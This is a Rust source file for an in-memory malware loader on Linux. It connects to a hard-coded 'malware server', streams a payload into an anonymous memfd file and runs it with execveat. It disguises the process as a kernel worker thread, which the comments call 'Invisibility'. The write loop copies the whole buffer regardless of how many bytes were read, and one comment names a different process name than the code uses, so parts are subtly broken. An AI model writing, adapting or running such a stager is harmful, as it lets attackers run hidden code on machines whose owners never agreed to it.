use std::{
            ffi::{CStr, CString}, io::Read, net::TcpStream
        };

use nix::{
            sys::memfd::{memfd_create, MemFdCreateFlag},
            unistd::{write, execveat},
            fcntl::AtFlags
        };

// Modify if needed
const ADDR: &str = "127.0.0.1:4444";  

fn main() {
    
    // Connects to malware server
    let mut stream = TcpStream::connect(ADDR).unwrap(); 

    // Name for memfd_create
    let name = CStr::from_bytes_with_nul(b"a\0").unwrap();

    // Creating memfd file
    let fd = memfd_create(&name, MemFdCreateFlag::MFD_CLOEXEC).unwrap();

    // Buffer
    let mut buf = vec![0u8; 1024];

    loop {
            // Read the Stream
            let r = stream.read(&mut buf).unwrap();
            if r == 0 {break;}
            
            // Write to buffer
            write(fd, &mut buf).unwrap();
           
            // Breaks if read is less than buffer 1024
            if r < 1024 {break;};
    }

    // args for execveat change name to [kworker/u:0-events] for Invisibility
    let args = CStr::from_bytes_with_nul(b"[kworker/ar.p]\0").unwrap();

    // environment variables 
    let env = CString::new("").unwrap();

    // pathname for execveat -> NONE
    let pathname = CStr::from_bytes_with_nul(b"\0").unwrap();

    // execveat
    execveat(fd, pathname, &[&args], &[&env], AtFlags::AT_EMPTY_PATH).unwrap();

}
